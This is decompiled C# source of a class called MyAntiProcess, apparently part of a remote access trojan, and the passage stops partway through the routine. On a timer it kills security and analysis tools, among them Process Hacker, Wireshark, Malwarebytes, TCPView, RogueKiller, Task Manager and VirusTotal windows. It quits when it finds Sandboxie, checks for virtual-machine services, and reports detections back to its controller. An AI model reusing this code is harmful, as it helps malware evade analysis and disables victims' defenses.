using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Timers;
using Lime;
using Microsoft.VisualBasic.CompilerServices;

public class MyAntiProcess
{
	private static System.Timers.Timer Timer;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Handler(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process process = default(Process);
		Process[] processes = default(Process[]);
		Process[] array = default(Process[]);
		int num6 = default(int);
		Process process2 = default(Process);
		Process process3 = default(Process);
		Process[] processesByName = default(Process[]);
		Process[] array2 = default(Process[]);
		int num7 = default(int);
		Process[] processesByName2 = default(Process[]);
		Process[] array3 = default(Process[]);
		int num8 = default(int);
		Process process4 = default(Process);
		Process[] processesByName3 = default(Process[]);
		Process[] array4 = default(Process[]);
		int num9 = default(int);
		Process process5 = default(Process);
		Process[] processesByName4 = default(Process[]);
		Process[] array5 = default(Process[]);
		int num10 = default(int);
		Process process6 = default(Process);
		Process[] processesByName5 = default(Process[]);
		Process[] array6 = default(Process[]);
		int num11 = default(int);
		Process process7 = default(Process);
		Process[] processesByName6 = default(Process[]);
		Process[] array7 = default(Process[]);
		int num12 = default(int);
		Process process8 = default(Process);
		Process[] processesByName7 = default(Process[]);
		Process[] array8 = default(Process[]);
		int num13 = default(int);
		Process process9 = default(Process);
		Process[] processesByName8 = default(Process[]);
		Process[] array9 = default(Process[]);
		int num14 = default(int);
		Process process10 = default(Process);
		Process[] processesByName9 = default(Process[]);
		Process[] array10 = default(Process[]);
		int num15 = default(int);
		Process process11 = default(Process);
		Process[] processesByName10 = default(Process[]);
		Process[] array11 = default(Process[]);
		int num16 = default(int);
		Process process12 = default(Process);
		Process[] processesByName11 = default(Process[]);
		Process[] array12 = default(Process[]);
		int num17 = default(int);
		Process process13 = default(Process);
		Process[] processesByName12 = default(Process[]);
		Process[] array13 = default(Process[]);
		int num18 = default(int);
		Process[] processesByName13 = default(Process[]);
		Process[] array14 = default(Process[]);
		int num19 = default(int);
		Process process14 = default(Process);
		Process[] processesByName14 = default(Process[]);
		Process[] array15 = default(Process[]);
		int num20 = default(int);
		Process process15 = default(Process);
		Process[] processesByName15 = default(Process[]);
		Process[] array16 = default(Process[]);
		int num21 = default(int);
		Process process16 = default(Process);
		Process[] processesByName16 = default(Process[]);
		Process[] array17 = default(Process[]);
		Process[] processesByName17 = default(Process[]);
		Process[] array18 = default(Process[]);
		int num22 = default(int);
		Process process17 = default(Process);
		Process[] processesByName18 = default(Process[]);
		Process[] array19 = default(Process[]);
		int num23 = default(int);
		Process process18 = default(Process);
		Process[] processesByName19 = default(Process[]);
		Process[] array20 = default(Process[]);
		int num24 = default(int);
		Process[] processesByName20 = default(Process[]);
		int num25 = default(int);
		Process[] processesByName21 = default(Process[]);
		Process[] array21 = default(Process[]);
		int num26 = default(int);
		Process process19 = default(Process);
		Process[] processesByName22 = default(Process[]);
		Process[] array22 = default(Process[]);
		int num27 = default(int);
		Process process20 = default(Process);
		Process[] processesByName23 = default(Process[]);
		Process[] array23 = default(Process[]);
		int num28 = default(int);
		Process process21 = default(Process);
		Process[] processesByName24 = default(Process[]);
		Process[] array24 = default(Process[]);
		int num29 = default(int);
		Process process22 = default(Process);
		Process[] processesByName25 = default(Process[]);
		Process[] array25 = default(Process[]);
		int num30 = default(int);
		Process process23 = default(Process);
		Process[] processesByName26 = default(Process[]);
		Process[] array26 = default(Process[]);
		int num31 = default(int);
		Process process24 = default(Process);
		Process[] processesByName27 = default(Process[]);
		Process[] array27 = default(Process[]);
		int num32 = default(int);
		Process process25 = default(Process);
		Process[] processes2 = default(Process[]);
		int num33 = default(int);
		Process process26 = default(Process);
		Process[] processes3 = default(Process[]);
		int num34 = default(int);
		Process process27 = default(Process);
		Process[] processes4 = default(Process[]);
		int num35 = default(int);
		Process process28 = default(Process);
		Process[] processes5 = default(Process[]);
		int num36 = default(int);
		Process process29 = default(Process);
		Process[] processes6 = default(Process[]);
		int num37 = default(int);
		Process process30 = default(Process);
		Process[] processes7 = default(Process[]);
		int num38 = default(int);
		Process process31 = default(Process);
		Process[] processes8 = default(Process[]);
		int num39 = default(int);
		Process process32 = default(Process);
		Process[] processes9 = default(Process[]);
		int num40 = default(int);
		Process process33 = default(Process);
		Process[] processes10 = default(Process[]);
		int num41 = default(int);
		Process process34 = default(Process);
		Process[] processes11 = default(Process[]);
		int num42 = default(int);
		Process process35 = default(Process);
		Process[] processes12 = default(Process[]);
		int num43 = default(int);
		Process process36 = default(Process);
		Process[] processes13 = default(Process[]);
		int num44 = default(int);
		Process process37 = default(Process);
		Process[] processes14 = default(Process[]);
		int num45 = default(int);
		Process process38 = default(Process);
		Process[] processes15 = default(Process[]);
		int num46 = default(int);
		Process process39 = default(Process);
		Process[] processes16 = default(Process[]);
		int num47 = default(int);
		Process process40 = default(Process);
		Process[] processes17 = default(Process[]);
		int num48 = default(int);
		Process process41 = default(Process);
		Process[] processes18 = default(Process[]);
		int num49 = default(int);
		Process process42 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 4173:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_0012;
							case 4:
								goto IL_002b;
							case 5:
								goto IL_0052;
							case 6:
								goto IL_005b;
							case 7:
								goto IL_0077;
							case 8:
							case 9:
								goto IL_0080;
							case 10:
								goto IL_008b;
							case 11:
								goto IL_009a;
							case 12:
								goto IL_00ab;
							case 13:
								goto IL_00be;
							case 14:
								goto IL_00cd;
							case 15:
								goto IL_00e0;
							case 16:
								goto IL_00ea;
							case 17:
								goto IL_00fd;
							case 18:
								goto IL_010c;
							case 19:
								goto IL_011f;
							case 20:
								goto IL_0129;
							case 21:
								goto IL_013c;
							case 22:
								goto IL_014b;
							case 23:
								goto IL_015e;
							case 24:
								goto IL_0168;
							case 25:
								goto IL_017b;
							case 26:
								goto IL_018a;
							case 27:
								goto IL_019d;
							case 28:
								goto IL_01a7;
							case 29:
								goto IL_01ba;
							case 30:
								goto IL_01c9;
							case 31:
								goto IL_01dc;
							case 32:
								goto IL_01e6;
							case 33:
								goto IL_01f9;
							case 34:
								goto IL_0208;
							case 35:
								goto IL_021b;
							case 36:
								goto IL_0225;
							case 37:
								goto IL_0238;
							case 38:
								goto IL_0247;
							case 39:
								goto IL_025a;
							case 40:
								goto IL_0264;
							case 41:
								goto IL_0277;
							case 42:
								goto IL_0286;
							case 43:
								goto IL_0299;
							case 44:
								goto IL_02a3;
							case 45:
								goto IL_02b6;
							case 46:
								goto IL_02c5;
							case 47:
								goto IL_02d8;
							case 48:
								goto IL_02e2;
							case 49:
								goto IL_02f5;
							case 50:
								goto IL_0304;
							case 51:
								goto IL_0317;
							case 52:
								goto IL_0321;
							case 53:
								goto IL_0334;
							case 54:
								goto IL_0343;
							case 55:
								goto IL_0356;
							case 56:
								goto IL_0360;
							case 57:
								goto IL_0373;
							case 58:
								goto IL_0382;
							case 59:
								goto IL_0395;
							case 60:
								goto IL_039f;
							case 61:
								goto IL_03b2;
							case 62:
								goto IL_03c1;
							case 63:
								goto IL_03d4;
							case 64:
								goto IL_03de;
							case 65:
								goto IL_03f1;
							case 66:
								goto IL_0400;
							case 67:
								goto IL_0413;
							case 68:
								goto IL_041d;
							case 69:
								goto IL_0430;
							case 70:
								goto IL_043f;
							case 71:
								goto IL_0452;
							case 72:
								goto IL_045c;
							case 73:
								goto IL_046f;
							case 74:
								goto IL_047e;
							case 75:
								goto IL_0491;
							case 76:
								goto IL_049b;
							case 77:
								goto IL_04ae;
							case 78:
								goto IL_04bd;
							case 79:
								goto IL_04d0;
							case 80:
								goto IL_04ed;
							case 81:
								goto IL_04f7;
							case 82:
								goto IL_050a;
							case 83:
								goto IL_0519;
							case 84:
								goto IL_0525;
							case 85:
								goto IL_0542;
							case 86:
								goto IL_054f;
							case 87:
								goto IL_0557;
							case 88:
								goto IL_056a;
							case 89:
								goto IL_057e;
							case 90:
								goto IL_059b;
							case 91:
								goto IL_05a5;
							case 92:
								goto IL_05ad;
							case 93:
								goto IL_05c0;
							case 94:
								goto IL_05cf;
							case 95:
								goto IL_05e2;
							case 96:
								goto IL_05ec;
							case 97:
								goto IL_05ff;
							case 98:
								goto IL_060e;
							case 99:
								goto IL_0621;
							case 100:
								goto IL_062b;
							case 101:
								goto IL_063e;
							case 102:
								goto IL_064d;
							case 103:
								goto IL_0660;
							case 104:
								goto IL_066a;
							case 105:
								goto IL_067d;
							case 106:
								goto IL_068c;
							case 107:
								goto IL_069f;
							case 108:
								goto IL_06a9;
							case 109:
								goto IL_06bc;
							case 110:
								goto IL_06cb;
							case 111:
								goto IL_06de;
							case 112:
								goto IL_06e8;
							case 113:
								goto IL_06fb;
							case 114:
								goto IL_070a;
							case 115:
								goto IL_071d;
							case 116:
								goto IL_0727;
							case 117:
								goto IL_073a;
							case 118:
								goto IL_0749;
							case 119:
								goto IL_075c;
							case 120:
								goto IL_0766;
							case 121:
								goto IL_0779;
							case 122:
								goto IL_0797;
							case 123:
								goto IL_07ad;
							case 124:
							case 125:
								goto IL_07b7;
							case 126:
								goto IL_07c2;
							case 127:
								goto IL_07e0;
							case 128:
								goto IL_07f6;
							case 129:
							case 130:
								goto IL_0803;
							case 131:
								goto IL_0811;
							case 132:
								goto IL_0832;
							case 133:
								goto IL_084b;
							case 134:
							case 135:
								goto IL_0858;
							case 136:
								goto IL_0866;
							case 137:
								goto IL_0887;
							case 138:
								goto IL_08a0;
							case 139:
							case 140:
								goto IL_08ad;
							case 141:
								goto IL_08bb;
							case 142:
								goto IL_08dc;
							case 143:
								goto IL_08f5;
							case 144:
							case 145:
								goto IL_0902;
							case 146:
								goto IL_0910;
							case 147:
								goto IL_0931;
							case 148:
								goto IL_094a;
							case 149:
							case 150:
								goto IL_0957;
							case 151:
								goto IL_0965;
							case 152:
								goto IL_0986;
							case 153:
								goto IL_099f;
							case 154:
							case 155:
								goto IL_09ac;
							case 156:
								goto IL_09ba;
							case 157:
								goto IL_09db;
							case 158:
								goto IL_09f4;
							case 159:
							case 160:
								goto IL_0a01;
							case 161:
								goto IL_0a0f;
							case 162:
								goto IL_0a30;
							case 163:
								goto IL_0a49;
							case 164:
							case 165:
								goto IL_0a56;
							case 166:
								goto IL_0a64;
							case 167:
								goto IL_0a85;
							case 168:
								goto IL_0a9e;
							case 169:
							case 170:
								goto IL_0aab;
							case 171:
								goto IL_0ab9;
							case 172:
								goto IL_0ada;
							case 173:
								goto IL_0af3;
							case 174:
							case 175:
								goto IL_0b00;
							case 176:
								goto IL_0b0e;
							case 177:
								goto IL_0b2f;
							case 178:
								goto IL_0b48;
							case 179:
							case 180:
								goto IL_0b55;
							case 181:
								goto IL_0b63;
							case 182:
								goto IL_0b84;
							case 183:
								goto IL_0b9d;
							case 184:
							case 185:
								goto IL_0baa;
							case 186:
								goto IL_0bb8;
							case 187:
								goto IL_0bd9;
							case 188:
								goto IL_0bf2;
							case 189:
							case 190:
								goto IL_0bff;
							case 191:
								goto IL_0c0d;
							case 192:
								goto IL_0c2e;
							case 193:
							case 194:
								goto IL_0c4c;
							case 195:
								goto IL_0c5a;
							case 196:
								goto IL_0c7b;
							case 197:
								goto IL_0c94;
							case 198:
							case 199:
								goto IL_0ca1;
							case 200:
								goto IL_0caf;
							case 201:
								goto IL_0cd0;
							case 202:
								goto IL_0ce9;
							case 203:
							case 204:
								goto IL_0cf6;
							default:
								goto end_IL_0001;
							case 205:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_045c:
						num = 72;
						num5++;
						goto IL_0465;
						IL_0452:
						num = 71;
						process.Kill();
						goto IL_045c;
						IL_000a:
						num = 2;
						processes = Process.GetProcesses();
						goto IL_0012;
						IL_0012:
						num = 3;
						array = processes;
						num6 = 0;
						goto IL_001a;
						IL_001a:
						if (num6 < array.Length)
						{
							process2 = array[num6];
							goto IL_002b;
						}
						goto IL_008b;
						IL_0356:
						num = 55;
						process3.Kill();
						goto IL_0360;
						IL_002b:
						num = 4;
						if (process2.MainWindowTitle.Contains("Process Hacker") | process2.MainWindowTitle.Contains("Process Explorer"))
						{
							goto IL_0052;
						}
						goto IL_0080;
						IL_0052:
						num = 5;
						Thread.Sleep(100);
						goto IL_005b;
						IL_005b:
						num = 6;
						Core.Send("MSG" + Core.Y + "AntiProcess: Process Hacker was detected!");
						goto IL_0077;
						IL_0077:
						num = 7;
						process2.Kill();
						goto IL_0080;
						IL_0080:
						num = 9;
						num6++;
						goto IL_001a;
						IL_008b:
						num = 10;
						processesByName = Process.GetProcessesByName("SbieCtrl");
						goto IL_009a;
						IL_009a:
						num = 11;
						array2 = processesByName;
						num7 = 0;
						goto IL_00b4;
						IL_00b4:
						if (num7 < array2.Length)
						{
							ProjectData.EndApp();
							goto IL_00ab;
						}
						goto IL_00be;
						IL_00be:
						num = 13;
						processesByName2 = Process.GetProcessesByName("SpyTheSpy");
						goto IL_00cd;
						IL_00cd:
						num = 14;
						array3 = processesByName2;
						num8 = 0;
						goto IL_00f3;
						IL_00f3:
						if (num8 < array3.Length)
						{
							process4 = array3[num8];
							goto IL_00e0;
						}
						goto IL_00fd;
						IL_00fd:
						num = 17;
						processesByName3 = Process.GetProcessesByName("SpeedGear");
						goto IL_010c;
						IL_010c:
						num = 18;
						array4 = processesByName3;
						num9 = 0;
						goto IL_0132;
						IL_0132:
						if (num9 < array4.Length)
						{
							process5 = array4[num9];
							goto IL_011f;
						}
						goto IL_013c;
						IL_013c:
						num = 21;
						processesByName4 = Process.GetProcessesByName("wireshark");
						goto IL_014b;
						IL_014b:
						num = 22;
						array5 = processesByName4;
						num10 = 0;
						goto IL_0171;
						IL_0171:
						if (num10 < array5.Length)
						{
							process6 = array5[num10];
							goto IL_015e;
						}
						goto IL_017b;
						IL_017b:
						num = 25;
						processesByName5 = Process.GetProcessesByName("mbam");
						goto IL_018a;
						IL_018a:
						num = 26;
						array6 = processesByName5;
						num11 = 0;
						goto IL_01b0;
						IL_01b0:
						if (num11 < array6.Length)
						{
							process7 = array6[num11];
							goto IL_019d;
						}
						goto IL_01ba;
						IL_01ba:
						num = 29;
						processesByName6 = Process.GetProcessesByName("apateDNS");
						goto IL_01c9;
						IL_01c9:
						num = 30;
						array7 = processesByName6;
						num12 = 0;
						goto IL_01ef;
						IL_01ef:
						if (num12 < array7.Length)
						{
							process8 = array7[num12];
							goto IL_01dc;
						}
						goto IL_01f9;
						IL_01f9:
						num = 33;
						processesByName7 = Process.GetProcessesByName("IPBlocker");
						goto IL_0208;
						IL_0208:
						num = 34;
						array8 = processesByName7;
						num13 = 0;
						goto IL_022e;
						IL_022e:
						if (num13 < array8.Length)
						{
							process9 = array8[num13];
							goto IL_021b;
						}
						goto IL_0238;
						IL_0238:
						num = 37;
						processesByName8 = Process.GetProcessesByName("cports");
						goto IL_0247;
						IL_0247:
						num = 38;
						array9 = processesByName8;
						num14 = 0;
						goto IL_026d;
						IL_026d:
						if (num14 < array9.Length)
						{
							process10 = array9[num14];
							goto IL_025a;
						}
						goto IL_0277;
						IL_0277:
						num = 41;
						processesByName9 = Process.GetProcessesByName("KeyScrambler");
						goto IL_0286;
						IL_0286:
						num = 42;
						array10 = processesByName9;
						num15 = 0;
						goto IL_02ac;
						IL_02ac:
						if (num15 < array10.Length)
						{
							process11 = array10[num15];
							goto IL_0299;
						}
						goto IL_02b6;
						IL_02b6:
						num = 45;
						processesByName10 = Process.GetProcessesByName("TiGeR-Firewall");
						goto IL_02c5;
						IL_02c5:
						num = 46;
						array11 = processesByName10;
						num16 = 0;
						goto IL_02eb;
						IL_02eb:
						if (num16 < array11.Length)
						{
							process12 = array11[num16];
							goto IL_02d8;
						}
						goto IL_02f5;
						IL_02f5:
						num = 49;
						processesByName11 = Process.GetProcessesByName("Tcpview");
						goto IL_0304;
						IL_0304:
						num = 50;
						array12 = processesByName11;
						num17 = 0;
						goto IL_032a;
						IL_032a:
						if (num17 < array12.Length)
						{
							process13 = array12[num17];
							goto IL_0317;
						}
						goto IL_0334;
						IL_0334:
						num = 53;
						processesByName12 = Process.GetProcessesByName("xn5x");
						goto IL_0343;
						IL_0343:
						num = 54;
						array13 = processesByName12;
						num18 = 0;
						goto IL_0369;
						IL_0369:
						if (num18 < array13.Length)
						{
							process3 = array13[num18];
							goto IL_0356;
						}
						goto IL_0373;
						IL_0373:
						num = 57;
						processesByName13 = Process.GetProcessesByName("smsniff");
						goto IL_0382;
						IL_0382:
						num = 58;
						array14 = processesByName13;
						num19 = 0;
						goto IL_03a8;
						IL_03a8:
						if (num19 < array14.Length)
						{
							process14 = array14[num19];
							goto IL_0395;
						}
						goto IL_03b2;
						IL_03b2:
						num = 61;
						processesByName14 = Process.GetProcessesByName("exeinfoPE");
						goto IL_03c1;
						IL_03c1:
						num = 62;
						array15 = processesByName14;
						num20 = 0;
						goto IL_03e7;
						IL_03e7:
						if (num20 < array15.Length)
						{
							process15 = array15[num20];
							goto IL_03d4;
						}
						goto IL_03f1;
						IL_03f1:
						num = 65;
						processesByName15 = Process.GetProcessesByName("regshot");
						goto IL_0400;
						IL_0400:
						num = 66;
						array16 = processesByName15;
						num21 = 0;
						goto IL_0426;
						IL_0426:
						if (num21 < array16.Length)
						{
							process16 = array16[num21];
							goto IL_0413;
						}
						goto IL_0430;
						IL_0430:
						num = 69;
						processesByName16 = Process.GetProcessesByName("RogueKiller");
						goto IL_043f;
						IL_043f:
						num = 70;
						array17 = processesByName16;
						num5 = 0;
						goto IL_0465;
						IL_0465:
						if (num5 < array17.Length)
						{
							process = array17[num5];
							goto IL_0452;
						}
						goto IL_046f;
						IL_046f:
						num = 73;
						processesByName17 = Process.GetProcessesByName("NetSnifferCs");
						goto IL_047e;
						IL_047e:
						num = 74;
						array18 = processesByName17;
						num22 = 0;
						goto IL_04a4;
						IL_04a4:
						if (num22 < array18.Length)
						{
							process17 = array18[num22];
							goto IL_0491;
						}
						goto IL_04ae;
						IL_04ae:
						num = 77;
						processesByName18 = Process.GetProcessesByName("taskmgr");
						goto IL_04bd;
						IL_04bd:
						num = 78;
						array19 = processesByName18;
						num23 = 0;
						goto IL_0500;
						IL_0500:
						if (num23 < array19.Length)
						{
							process18 = array19[num23];
							goto IL_04d0;
						}
						goto IL_050a;
						IL_050a:
						num = 82;
						processesByName19 = Process.GetProcessesByName("VGAuthService");
						goto IL_0519;
						IL_0519:
						num = 83;
						array20 = processesByName19;
						num24 = 0;
						goto IL_0560;
						IL_0560:
						if (num24 < array20.Length)
						{
							goto IL_0525;
						}
						goto IL_056a;
						IL_056a:
						num = 88;
						processesByName20 = Process.GetProcessesByName("VBoxService");
						num25 = 0;
						goto IL_05b6;
						IL_05b6:
						if (num25 < processesByName20.Length)
						{
							goto IL_057e;
						}
						goto IL_05c0;
						IL_05c0:
						num = 93;
						processesByName21 = Process.GetProcessesByName("Reflector");
						goto IL_05cf;
						IL_05cf:
						num = 94;
						array21 = processesByName21;
						num26 = 0;
						goto IL_05f5;
						IL_05f5:
						if (num26 < array21.Length)
						{
							process19 = array21[num26];
							goto IL_05e2;
						}
						goto IL_05ff;
						IL_05ff:
						num = 97;
						processesByName22 = Process.GetProcessesByName("capsa");
						goto IL_060e;
						IL_060e:
						num = 98;
						array22 = processesByName22;
						num27 = 0;
						goto IL_0634;
						IL_0634:
						if (num27 < array22.Length)
						{
							process20 = array22[num27];
							goto IL_0621;
						}
						goto IL_063e;
						IL_063e:
						num = 101;
						processesByName23 = Process.GetProcessesByName("NetworkMiner");
						goto IL_064d;
						IL_064d:
						num = 102;
						array23 = processesByName23;
						num28 = 0;
						goto IL_0673;
						IL_0673:
						if (num28 < array23.Length)
						{
							process21 = array23[num28];
							goto IL_0660;
						}
						goto IL_067d;
						IL_067d:
						num = 105;
						processesByName24 = Process.GetProcessesByName("AdvancedProcessController");
						goto IL_068c;
						IL_068c:
						num = 106;
						array24 = processesByName24;
						num29 = 0;
						goto IL_06b2;
						IL_06b2:
						if (num29 < array24.Length)
						{
							process22 = array24[num29];
							goto IL_069f;
						}
						goto IL_06bc;
						IL_06bc:
						num = 109;
						processesByName25 = Process.GetProcessesByName("ProcessLassoLauncher");
						goto IL_06cb;
						IL_06cb:
						num = 110;
						array25 = processesByName25;
						num30 = 0;
						goto IL_06f1;
						IL_06f1:
						if (num30 < array25.Length)
						{
							process23 = array25[num30];
							goto IL_06de;
						}
						goto IL_06fb;
						IL_06fb:
						num = 113;
						processesByName26 = Process.GetProcessesByName("ProcessLasso");
						goto IL_070a;
						IL_070a:
						num = 114;
						array26 = processesByName26;
						num31 = 0;
						goto IL_0730;
						IL_0730:
						if (num31 < array26.Length)
						{
							process24 = array26[num31];
							goto IL_071d;
						}
						goto IL_073a;
						IL_073a:
						num = 117;
						processesByName27 = Process.GetProcessesByName("SystemExplorer");
						goto IL_0749;
						IL_0749:
						num = 118;
						array27 = processesByName27;
						num32 = 0;
						goto IL_076f;
						IL_076f:
						if (num32 < array27.Length)
						{
							process25 = array27[num32];
							goto IL_075c;
						}
						goto IL_0779;
						IL_0779:
						num = 121;
						processes2 = Process.GetProcesses();
						num33 = 0;
						goto IL_0786;
						IL_0786:
						if (num33 < processes2.Length)
						{
							process26 = processes2[num33];
							goto IL_0797;
						}
						goto IL_07c2;
						IL_0225:
						num = 36;
						num13++;
						goto IL_022e;
						IL_0797:
						num = 122;
						if (process26.MainWindowTitle.Contains("ApateDNS"))
						{
							goto IL_07ad;
						}
						goto IL_07b7;
						IL_07ad:
						num = 123;
						process26.Kill();
						goto IL_07b7;
						IL_07b7:
						num = 125;
						num33++;
						goto IL_0786;
						IL_07c2:
						num = 126;
						processes3 = Process.GetProcesses();
						num34 = 0;
						goto IL_07cf;
						IL_07cf:
						if (num34 < processes3.Length)
						{
							process27 = processes3[num34];
							goto IL_07e0;
						}
						goto IL_0811;
						IL_0317:
						num = 51;
						process13.Kill();
						goto IL_0321;
						IL_07e0:
						num = 127;
						if (process27.MainWindowTitle.Contains("Malwarebytes Anti-Malware"))
						{
							goto IL_07f6;
						}
						goto IL_0803;
						IL_07f6:
						num = 128;
						process27.Kill();
						goto IL_0803;
						IL_0803:
						num = 130;
						num34++;
						goto IL_07cf;
						IL_0811:
						num = 131;
						processes4 = Process.GetProcesses();
						num35 = 0;
						goto IL_0821;
						IL_0821:
						if (num35 < processes4.Length)
						{
							process28 = processes4[num35];
							goto IL_0832;
						}
						goto IL_0866;
						IL_01dc:
						num = 31;
						process8.Kill();
						goto IL_01e6;
						IL_0832:
						num = 132;
						if (process28.MainWindowTitle.Contains("TCPEye"))
						{
							goto IL_084b;
						}
						goto IL_0858;
						IL_084b:
						num = 133;
						process28.Kill();
						goto IL_0858;
						IL_0858:
						num = 135;
						num35++;
						goto IL_0821;
						IL_0866:
						num = 136;
						processes5 = Process.GetProcesses();
						num36 = 0;
						goto IL_0876;
						IL_0876:
						if (num36 < processes5.Length)
						{
							process29 = processes5[num36];
							goto IL_0887;
						}
						goto IL_08bb;
						IL_01e6:
						num = 32;
						num12++;
						goto IL_01ef;
						IL_0887:
						num = 137;
						if (process29.MainWindowTitle.Contains("SmartSniff"))
						{
							goto IL_08a0;
						}
						goto IL_08ad;
						IL_08a0:
						num = 138;
						process29.Kill();
						goto IL_08ad;
						IL_08ad:
						num = 140;
						num36++;
						goto IL_0876;
						IL_08bb:
						num = 141;
						processes6 = Process.GetProcesses();
						num37 = 0;
						goto IL_08cb;
						IL_08cb:
						if (num37 < processes6.Length)
						{
							process30 = processes6[num37];
							goto IL_08dc;
						}
						goto IL_0910;
						IL_03de:
						num = 64;
						num20++;
						goto IL_03e7;
						IL_08dc:
						num = 142;
						if (process30.MainWindowTitle.Contains("Active Ports"))
						{
							goto IL_08f5;
						}
						goto IL_0902;
						IL_08f5:
						num = 143;
						process30.Kill();
						goto IL_0902;
						IL_0902:
						num = 145;
						num37++;
						goto IL_08cb;
						IL_0910:
						num = 146;
						processes7 = Process.GetProcesses();
						num38 = 0;
						goto IL_0920;
						IL_0920:
						if (num38 < processes7.Length)
						{
							process31 = processes7[num38];
							goto IL_0931;
						}
						goto IL_0965;
						IL_019d:
						num = 27;
						process7.Kill();
						goto IL_01a7;
						IL_0931:
						num = 147;
						if (process31.MainWindowTitle.Contains("ProcessEye"))
						{
							goto IL_094a;
						}
						goto IL_0957;
						IL_094a:
						num = 148;
						process31.Kill();
						goto IL_0957;
						IL_0957:
						num = 150;
						num38++;
						goto IL_0920;
						IL_0965:
						num = 151;
						processes8 = Process.GetProcesses();
						num39 = 0;
						goto IL_0975;
						IL_0975:
						if (num39 < processes8.Length)
						{
							process32 = processes8[num39];
							goto IL_0986;
						}
						goto IL_09ba;
						IL_01a7:
						num = 28;
						num11++;
						goto IL_01b0;
						IL_0986:
						num = 152;
						if (process32.MainWindowTitle.Contains("MKN TaskExplorer"))
						{
							goto IL_099f;
						}
						goto IL_09ac;
						IL_099f:
						num = 153;
						process32.Kill();
						goto IL_09ac;
						IL_09ac:
						num = 155;
						num39++;
						goto IL_0975;
						IL_09ba:
						num = 156;
						processes9 = Process.GetProcesses();
						num40 = 0;
						goto IL_09ca;
						IL_09ca:
						if (num40 < processes9.Length)
						{
							process33 = processes9[num40];
							goto IL_09db;
						}
						goto IL_0a0f;
						IL_03d4:
						num = 63;
						process15.Kill();
						goto IL_03de;
						IL_09db:
						num = 157;
						if (process33.MainWindowTitle.Contains("CurrPorts"))
						{
							goto IL_09f4;
						}
						goto IL_0a01;
						IL_09f4:
						num = 158;
						process33.Kill();
						goto IL_0a01;
						IL_0a01:
						num = 160;
						num40++;
						goto IL_09ca;
						IL_0a0f:
						num = 161;
						processes10 = Process.GetProcesses();
						num41 = 0;
						goto IL_0a1f;
						IL_0a1f:
						if (num41 < processes10.Length)
						{
							process34 = processes10[num41];
							goto IL_0a30;
						}
						goto IL_0a64;
						IL_015e:
						num = 23;
						process6.Kill();
						goto IL_0168;
						IL_0a30:
						num = 162;
						if (process34.MainWindowTitle.Contains("System Explorer"))
						{
							goto IL_0a49;
						}
						goto IL_0a56;
						IL_0a49:
						num = 163;
						process34.Kill();
						goto IL_0a56;
						IL_0a56:
						num = 165;
						num41++;
						goto IL_0a1f;
						IL_0a64:
						num = 166;
						processes11 = Process.GetProcesses();
						num42 = 0;
						goto IL_0a74;
						IL_0a74:
						if (num42 < processes11.Length)
						{
							process35 = processes11[num42];
							goto IL_0a85;
						}
						goto IL_0ab9;
						IL_0168:
						num = 24;
						num10++;
						goto IL_0171;
						IL_0a85:
						num = 167;
						if (process35.MainWindowTitle.Contains("DiamondCS Port Explorer"))
						{
							goto IL_0a9e;
						}
						goto IL_0aab;
						IL_0a9e:
						num = 168;
						process35.Kill();
						goto IL_0aab;
						IL_0aab:
						num = 170;
						num42++;
						goto IL_0a74;
						IL_0ab9:
						num = 171;
						processes12 = Process.GetProcesses();
						num43 = 0;
						goto IL_0ac9;
						IL_0ac9:
						if (num43 < processes12.Length)
						{
							process36 = processes12[num43];
							goto IL_0ada;
						}
						goto IL_0b0e;
						IL_0321:
						num = 52;
						num17++;
						goto IL_032a;
						IL_0ada:
						num = 172;
						if (process36.MainWindowTitle.Contains("VirusTotal"))
						{
							goto IL_0af3;
						}
						goto IL_0b00;
						IL_0af3:
						num = 173;
						process36.Kill();
						goto IL_0b00;
						IL_0b00:
						num = 175;
						num43++;
						goto IL_0ac9;
						IL_0b0e:
						num = 176;
						processes13 = Process.GetProcesses();
						num44 = 0;
						goto IL_0b1e;
						IL_0b1e:
						if (num44 < processes13.Length)
						{
							process37 = processes13[num44];
							goto IL_0b2f;
						}
						goto IL_0b63;
						IL_011f:
						num = 19;
						process5.Kill();
						goto IL_0129;
						IL_0b2f:
						num = 177;
						if (process37.MainWindowTitle.Contains("Metascan Online"))
						{
							goto IL_0b48;
						}
						goto IL_0b55;
						IL_0b48:
						num = 178;
						process37.Kill();
						goto IL_0b55;
						IL_0b55:
						num = 180;
						num44++;
						goto IL_0b1e;
						IL_0b63:
						num = 181;
						processes14 = Process.GetProcesses();
						num45 = 0;
						goto IL_0b73;
						IL_0b73:
						if (num45 < processes14.Length)
						{
							process38 = processes14[num45];
							goto IL_0b84;
						}
						goto IL_0bb8;
						IL_0129:
						num = 20;
						num9++;
						goto IL_0132;
						IL_0b84:
						num = 182;
						if (process38.MainWindowTitle.Contains("Speed Gear"))
						{
							goto IL_0b9d;
						}
						goto IL_0baa;
						IL_0b9d:
						num = 183;
						process38.Kill();
						goto IL_0baa;
						IL_0baa:
						num = 185;
						num45++;
						goto IL_0b73;
						IL_0bb8:
						num = 186;
						processes15 = Process.GetProcesses();
						num46 = 0;
						goto IL_0bc8;
						IL_0bc8:
						if (num46 < processes15.Length)
						{
							process39 = processes15[num46];
							goto IL_0bd9;
						}
						goto IL_0c0d;
						IL_041d:
						num = 68;
						num21++;
						goto IL_0426;
						IL_0bd9:
						num = 187;
						if (process39.ProcessName.Contains("The Wireshark Network Analyzer"))
						{
							goto IL_0bf2;
						}
						goto IL_0bff;
						IL_0bf2:
						num = 188;
						process39.Kill();
						goto IL_0bff;
						IL_0bff:
						num = 190;
